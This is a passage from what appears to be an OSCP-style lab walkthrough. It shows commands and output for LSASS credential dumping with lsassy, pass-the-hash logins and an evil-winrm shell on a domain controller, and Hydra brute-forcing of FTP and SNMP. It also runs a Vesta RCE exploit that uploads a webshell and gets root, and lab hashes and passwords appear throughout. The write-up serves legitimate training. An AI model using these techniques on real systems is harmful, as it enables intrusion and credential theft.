+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-NXC" >}} NXC 's lsa module will not trigger the Windows Defender to extra the lsa and export the NTLM

{{< /toggle >}}

```
┌─[tester@parrot]─[~]
└──╼ $nxc smb 10.10.180.154  -u 'administrator' -p 'hghgib6vHT3bVWf' --local-auth -M lsassy
SMB         10.10.180.154   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:MS02) (signing:False) (SMBv1:None)
SMB         10.10.180.154   445    MS02             [+] MS02\administrator:hghgib6vHT3bVWf (Pwn3d!)
LSASSY      10.10.180.154   445    MS02             Saved 14 Kerberos ticket(s) to /home/tester/.nxc/modules/lsassy
LSASSY      10.10.180.154   445    MS02             MS02\cloudbase-init 550f03699b0d599bba2275b33ae8a72c
LSASSY      10.10.180.154   445    MS02             OSCP\Administrator 59b280ba707d22e3ef0aa587fc29ffe5

```

# Recon IP 1

```
┌─[tester@parrot]─[~]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}..."; netexec $proto 10.10.180.152 -u Administrator -H  59b280ba707d22e3ef0aa587fc29ffe5 $auth; done; done

[*] Testing smb ...
SMB         10.10.180.152   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.180.152   445    DC01             [+] oscp.exam\Administrator:59b280ba707d22e3ef0aa587fc29ffe5 (Pwn3d!)

[*] Testing smb (local-auth)...
SMB         10.10.180.152   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.180.152   445    DC01             [-] DC01\Administrator:59b280ba707d22e3ef0aa587fc29ffe5 STATUS_LOGON_FAILURE 

[*] Testing winrm ...
WINRM       10.10.180.152   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam) 
WINRM       10.10.180.152   5985   DC01             [+] oscp.exam\Administrator:59b280ba707d22e3ef0aa587fc29ffe5 (Pwn3d!)

[*] Testing winrm (local-auth)...
WINRM       10.10.180.152   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam) 
WINRM       10.10.180.152   5985   DC01             [-] DC01\Administrator:59b280ba707d22e3ef0aa587fc29ffe5

[*] Testing wmi ...
RPC         10.10.180.152   135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
WMI         10.10.180.152   135    DC01             [+] oscp.exam\Administrator:59b280ba707d22e3ef0aa587fc29ffe5 (Pwn3d!)

[*] Testing wmi (local-auth)...
RPC         10.10.180.152   135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
RPC         10.10.180.152   135    DC01             [-] DC01\Administrator:59b280ba707d22e3ef0aa587fc29ffe5 (RPC_S_ACCESS_DENIED)

[*] Testing rdp ...

[*] Testing rdp (local-auth)...


```

```
┌─[✗]─[tester@parrot]─[~]
└──╼ $evil-winrm-py -i 10.10.180.152  -u Administrator -H 59b280ba707d22e3ef0aa587fc29ffe5 
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '10.10.180.152:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
oscp\administrator

```

# Recon IP 4

### PORT & IP SCAN

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.180.156 -oN serviceScan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-02 20:57 HKT
Nmap scan report for 192.168.180.156
Host is up (0.044s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:b6:ba:06:9a:f9:49:81:b0:59:5e:28:b9:78:e2:ef (RSA)
|   256 56:93:2b:76:37:a0:8b:37:df:14:16:03:ef:43:e0:39 (ECDSA)
|_  256 54:62:4b:e1:e9:68:62:5f:da:c0:86:e1:43:24:d1:44 (ED25519)
25/tcp   open  smtp     Exim smtpd 4.90_1
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
| smtp-commands: lab-pwk2-student-cl6-156-ubuntu20-frankfurt-242-130 Hello nmap.scanme.org [192.168.45.161], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2026-07-02T12:59:30+00:00; +1m29s from scanner time.
53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
80/tcp   open  http     nginx
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: oscp.exam &mdash; Coming Soon
110/tcp  open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL(PLAIN LOGIN) TOP CAPA RESP-CODES PIPELINING AUTH-RESP-CODE STLS UIDL USER
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: AUTH=LOGINA0001 listed SASL-IR post-login more IDLE have OK STARTTLS AUTH=PLAIN capabilities IMAP4rev1 Pre-login LITERAL+ ID ENABLE LOGIN-REFERRALS
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: TLS randomness does not represent time
465/tcp  open  ssl/smtp Exim smtpd 4.90_1
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: 2026-07-02T12:56:54+00:00; -1m07s from scanner time.
| smtp-commands: lab-pwk2-student-cl6-156-ubuntu20-frankfurt-242-130 Hello nmap.scanme.org [192.168.45.161], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
587/tcp  open  smtp     Exim smtpd 4.90_1
| smtp-commands: lab-pwk2-student-cl6-156-ubuntu20-frankfurt-242-130 Hello nmap.scanme.org [192.168.45.161], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_ssl-date: 2026-07-02T12:58:22+00:00; +21s from scanner time.
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: more have AUTH=LOGINA0001 LITERAL+ AUTH=PLAIN listed capabilities SASL-IR LOGIN-REFERRALS IMAP4rev1 post-login Pre-login ENABLE IDLE ID OK
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
995/tcp  open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_pop3-capabilities: RESP-CODES PIPELINING SASL(PLAIN LOGIN) TOP CAPA USER AUTH-RESP-CODE UIDL
|_ssl-date: TLS randomness does not represent time
2525/tcp open  smtp     Exim smtpd 4.90_1
| smtp-commands: lab-pwk2-student-cl6-156-ubuntu20-frankfurt-242-130 Hello nmap.scanme.org [192.168.45.161], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2026-07-02T12:58:30+00:00; +29s from scanner time.
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-11-08T08:15:37
|_Not valid after:  2032-11-05T08:15:37
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40-0ubuntu0.18.04.1
|   Thread ID: 134
|   Capabilities flags: 65535
|   Some Capabilities: SwitchToSSLAfterHandshake, LongPassword, ConnectWithDatabase, Speaks41ProtocolOld, Speaks41ProtocolNew, FoundRows, SupportsCompression, SupportsTransactions, DontAllowDatabaseTableColumn, LongColumnFlag, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, InteractiveClient, ODBCClient, IgnoreSigpipes, Support41Auth, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: "e/\x14k.C3
| \x0C
| D_\x0B!./O=\x14
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: oscp.exam &mdash; Coming Soon
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
8083/tcp open  http     nginx
|_http-title: Did not follow redirect to https://192.168.180.156:8083/
8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: Host: lab-pwk2-student-cl6-156-ubuntu20-frankfurt-242-130; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 17s, deviation: 1m04s, median: 20s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.08 seconds
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $sudo nmap -sU --top-port=100 192.168.180.156 --min-rate=10000
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-02 21:29 HKT
Nmap scan report for 192.168.180.156
Host is up (0.049s latency).
Not shown: 93 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
53/udp    open   domain
136/udp   closed profile
161/udp   open   snmp
623/udp   closed asf-rmcp
631/udp   closed ipp
3703/udp  closed adobeserver-3
32769/udp closed filenet-rpc

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds

```

### FTP

{{< toggle "Tag 🏷️" >}}

{{< tag "Port21-FTP-burteforce" >}} With the ftp-betterdefaultpasslist.txt  to brute-force the FTP target

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 
--2026-07-02 21:09:32--  https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 955 [text/plain]
Saving to: ‘ftp-betterdefaultpasslist.txt’

```

Using the Hydra to attack

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $hydra -C ./ftp-betterdefaultpasslist.txt  ftp://192.168.180.156 -f -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-02 21:11:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.180.156:21/
[ATTEMPT] target 192.168.180.156 - login "anonymous" - pass "anonymous" - 1 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.180.156 - login "root" - pass "rootpasswd" - 2 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.180.156 - login "root" - pass "12hrs37" - 3 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.180.156 - login "ftp" - pass "b1uRR3" - 4 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "admin" - 5 of 66 [child 4] (0/0)
[ATTEMPT] target 192.168.180.156 - login "localadmin" - pass "localadmin" - 6 of 66 [child 5] (0/0)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "1234" - 7 of 66 [child 6] (0/0)
[ATTEMPT] target 192.168.180.156 - login "apc" - pass "apc" - 8 of 66 [child 7] (0/0)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "nas" - 9 of 66 [child 8] (0/0)
[ATTEMPT] target 192.168.180.156 - login "Root" - pass "wago" - 10 of 66 [child 9] (0/0)
[ATTEMPT] target 192.168.180.156 - login "Admin" - pass "wago" - 11 of 66 [child 10] (0/0)
[ATTEMPT] target 192.168.180.156 - login "User" - pass "user" - 12 of 66 [child 11] (0/0)
[ATTEMPT] target 192.168.180.156 - login "Guest" - pass "guest" - 13 of 66 [child 12] (0/0)
[ATTEMPT] target 192.168.180.156 - login "ftp" - pass "ftp" - 14 of 66 [child 13] (0/0)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "password" - 15 of 66 [child 14] (0/0)
[ATTEMPT] target 192.168.180.156 - login "a" - pass "avery" - 16 of 66 [child 15] (0/0)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "123456" - 17 of 72 [child 4] (0/6)
[ATTEMPT] target 192.168.180.156 - login "adtec" - pass "none" - 18 of 72 [child 3] (0/6)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "admin12345" - 19 of 72 [child 0] (0/6)
[ATTEMPT] target 192.168.180.156 - login "none" - pass "dpstelecom" - 20 of 72 [child 1] (0/6)
[ATTEMPT] target 192.168.180.156 - login "instrument" - pass "instrument" - 21 of 72 [child 2] (0/6)
[ATTEMPT] target 192.168.180.156 - login "user" - pass "password" - 22 of 72 [child 5] (0/6)
[ATTEMPT] target 192.168.180.156 - login "root" - pass "password" - 23 of 72 [child 7] (0/6)
[ATTEMPT] target 192.168.180.156 - login "default" - pass "default" - 24 of 72 [child 8] (0/6)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "default" - 25 of 72 [child 9] (0/6)
[ATTEMPT] target 192.168.180.156 - login "nmt" - pass "1234" - 26 of 72 [child 12] (0/6)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "Janitza" - 27 of 72 [child 4] (0/6)
[ATTEMPT] target 192.168.180.156 - login "supervisor" - pass "supervisor" - 28 of 72 [child 3] (0/6)
[ATTEMPT] target 192.168.180.156 - login "user1" - pass "pass1" - 29 of 72 [child 1] (0/6)
[ATTEMPT] target 192.168.180.156 - login "avery" - pass "avery" - 30 of 72 [child 12] (0/6)
[ATTEMPT] target 192.168.180.156 - login "IEIeMerge" - pass "eMerge" - 31 of 72 [child 8] (0/6)
[ATTEMPT] target 192.168.180.156 - login "ADMIN" - pass "12345" - 32 of 72 [child 0] (0/6)
[ATTEMPT] target 192.168.180.156 - login "beijer" - pass "beijer" - 33 of 72 [child 2] (0/6)
[ATTEMPT] target 192.168.180.156 - login "Admin" - pass "admin" - 34 of 72 [child 5] (0/6)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "1234" - 35 of 72 [child 9] (0/6)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "1111" - 36 of 72 [child 7] (0/6)
[ATTEMPT] target 192.168.180.156 - login "root" - pass "admin" - 37 of 72 [child 4] (0/6)
[ATTEMPT] target 192.168.180.156 - login "se" - pass "1234" - 38 of 72 [child 3] (0/6)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "stingray" - 39 of 72 [child 12] (0/6)
[ATTEMPT] target 192.168.180.156 - login "device" - pass "apc" - 40 of 72 [child 1] (0/6)
[ATTEMPT] target 192.168.180.156 - login "apc" - pass "apc" - 41 of 72 [child 8] (0/6)
[ATTEMPT] target 192.168.180.156 - login "dm" - pass "ftp" - 42 of 72 [child 0] (0/6)
[ATTEMPT] target 192.168.180.156 - login "dmftp" - pass "ftp" - 43 of 72 [child 2] (0/6)
[ATTEMPT] target 192.168.180.156 - login "httpadmin" - pass "fhttpadmin" - 44 of 72 [child 5] (0/6)
[ATTEMPT] target 192.168.180.156 - login "user" - pass "system" - 45 of 72 [child 9] (0/6)
[ATTEMPT] target 192.168.180.156 - login "MELSEC" - pass "MELSEC" - 46 of 72 [child 7] (0/6)
[ATTEMPT] target 192.168.180.156 - login "QNUDECPU" - pass "QNUDECPU" - 47 of 72 [child 4] (0/6)
[ATTEMPT] target 192.168.180.156 - login "ftp_boot" - pass "ftp_boot" - 48 of 72 [child 3] (0/6)
[ATTEMPT] target 192.168.180.156 - login "uploader" - pass "ZYPCOM" - 49 of 72 [child 12] (0/6)
[ATTEMPT] target 192.168.180.156 - login "ftpuser" - pass "password" - 50 of 72 [child 1] (0/6)
[ATTEMPT] target 192.168.180.156 - login "USER" - pass "USER" - 51 of 72 [child 8] (0/6)
[ATTEMPT] target 192.168.180.156 - login "qbf77101" - pass "hexakisoctahedron" - 52 of 72 [child 0] (0/6)
[ATTEMPT] target 192.168.180.156 - login "ntpupdate" - pass "ntpupdate" - 53 of 72 [child 5] (0/6)
[ATTEMPT] target 192.168.180.156 - login "sysdiag" - pass "factorycast@schneider" - 54 of 72 [child 2] (0/6)
[ATTEMPT] target 192.168.180.156 - login "wsupgrade" - pass "wsupgrade" - 55 of 72 [child 7] (0/6)
[ATTEMPT] target 192.168.180.156 - login "pcfactory" - pass "pcfactory" - 56 of 72 [child 9] (0/6)
[ATTEMPT] target 192.168.180.156 - login "loader" - pass "fwdownload" - 57 of 72 [child 4] (0/6)
[ATTEMPT] target 192.168.180.156 - login "test" - pass "testingpw" - 58 of 72 [child 3] (0/6)
[ATTEMPT] target 192.168.180.156 - login "webserver" - pass "webpages" - 59 of 72 [child 12] (0/6)
[ATTEMPT] target 192.168.180.156 - login "fdrusers" - pass "sresurdf" - 60 of 72 [child 1] (0/6)
[ATTEMPT] target 192.168.180.156 - login "nic2212" - pass "poiuypoiuy" - 61 of 72 [child 8] (0/6)
[ATTEMPT] target 192.168.180.156 - login "user" - pass "user00" - 62 of 72 [child 0] (0/6)
[ATTEMPT] target 192.168.180.156 - login "su" - pass "ko2003wa" - 63 of 72 [child 5] (0/6)
[ATTEMPT] target 192.168.180.156 - login "MayGion" - pass "maygion.com" - 64 of 72 [child 7] (0/6)
[ATTEMPT] target 192.168.180.156 - login "admin" - pass "9999" - 65 of 72 [child 9] (0/6)
[ATTEMPT] target 192.168.180.156 - login "PlcmSpIp" - pass "PlcmSpIp" - 66 of 72 [child 2] (0/6)
[REDO-ATTEMPT] target 192.168.180.156 - login "Admin" - pass "wago" - 67 of 72 [child 1] (1/6)
[REDO-ATTEMPT] target 192.168.180.156 - login "admin" - pass "1234" - 68 of 72 [child 0] (2/6)
[REDO-ATTEMPT] target 192.168.180.156 - login "User" - pass "user" - 69 of 72 [child 2] (3/6)
[REDO-ATTEMPT] target 192.168.180.156 - login "ftp" - pass "ftp" - 70 of 72 [child 3] (4/6)
[REDO-ATTEMPT] target 192.168.180.156 - login "admin" - pass "password" - 71 of 72 [child 4] (5/6)
[REDO-ATTEMPT] target 192.168.180.156 - login "a" - pass "avery" - 72 of 72 [child 5] (6/6)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-02 21:12:18

```

### snmap

{{< toggle "Tag 🏷️" >}}

{{< tag "Port161-snmp" >}} Discovery the port 161 with snmp and using the snmpbulkwalk

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.180.156
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-02 21:37:05
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task
[DATA] attacking snmp://192.168.180.156:161/
[161][snmp] host: 192.168.180.156   password: public
[STATUS] attack finished for 192.168.180.156 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-02 21:37:15

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $snmpwalk -v2c -c public 192.168.180.156 NET-SNMP-EXTEND-MIB::nsExtendConfigTable
NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password-cmd" = STRING: /bin/echo
NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password" = STRING: -c "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password-cmd" = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"
NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password-cmd" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password-cmd" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password" = INTEGER: shell(2)
NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password-cmd" = INTEGER: shell(2)
NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password-cmd" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password-cmd" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password-cmd" = INTEGER: active(1)
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $snmpwalk -v2c -c public 192.168.180.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password-cmd" = STRING: /bin/echo
NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password" = STRING: -c "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password-cmd" = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"
NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password-cmd" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password-cmd" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password" = INTEGER: shell(2)
NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password-cmd" = INTEGER: shell(2)
NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password-cmd" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password-cmd" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password-cmd" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."reset-password" = STRING: Changing password for jack.
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."reset-password-cmd" = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."reset-password" = STRING: Changing password for jack.
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."reset-password-cmd" = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."reset-password" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."reset-password-cmd" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."reset-password" = INTEGER: 256
NET-SNMP-EXTEND-MIB::nsExtendResult."reset-password-cmd" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."reset-password".1 = STRING: Changing password for jack.
NET-SNMP-EXTEND-MIB::nsExtendOutLine."reset-password-cmd".1 = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd

```

Login with the web vesta

{{< toggle "Tag 🏷️" >}}

{{< tag "CMS-vesta-RCE-auth" >}}With the auth user to do the RCE in the vesta

{{< /toggle >}}

![Pasted image 20260702215334.png](/ob/Pasted%20image%2020260702215334.png)

https://github.com/CSpanias/vesta-rce-exploit

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $git clone https://github.com/CSpanias/vesta-rce-exploit.git
Cloning into 'vesta-rce-exploit'...
remote: Enumerating objects: 28, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 28 (delta 6), reused 11 (delta 3), pack-reused 0 (from 0)
Receiving objects: 100% (28/28), 13.45 KiB | 444.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC/vesta-rce-exploit]
└──╼ $python3 vesta-rce-exploit.py https://192.168.180.156:8083 jack 3PUKsX98BMupBiCf 
[INFO] Attempting login to https://192.168.180.156:8083 as jack
[+] Logged in as jack
[INFO] Checking for existing webshell or creating one
[!] igw5ov3cvn.poc not found, creating one...
[+] igw5ov3cvn.poc added
[+] igw5ov3cvn.poc found, looking up webshell
[!] webshell not found, creating one..
[+] Webshell uploaded
[INFO] Creating mailbox on domain igw5ov3cvn.poc
[!] Mail domain not found, creating one..
[+] Mail domain created
[+] Mail account created
[INFO] Editing mailbox to test payload
[INFO] Deploying backdoor via mailbox editing
[INFO] [+] Root shell possibly obtained. Enter commands:
# whoami 
root

# 


```

# Recon IP 5

### PORT & IP SCAN

```

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 30.30 seconds
           Raw packets sent: 73802 (3.247MB) | Rcvd: 73111 (2.924MB)
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-03 16:41 HKT
Nmap scan report for 192.168.242.157
Host is up (0.040s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
| ftp-syst: 
|   STAT: 
| FTP server status:
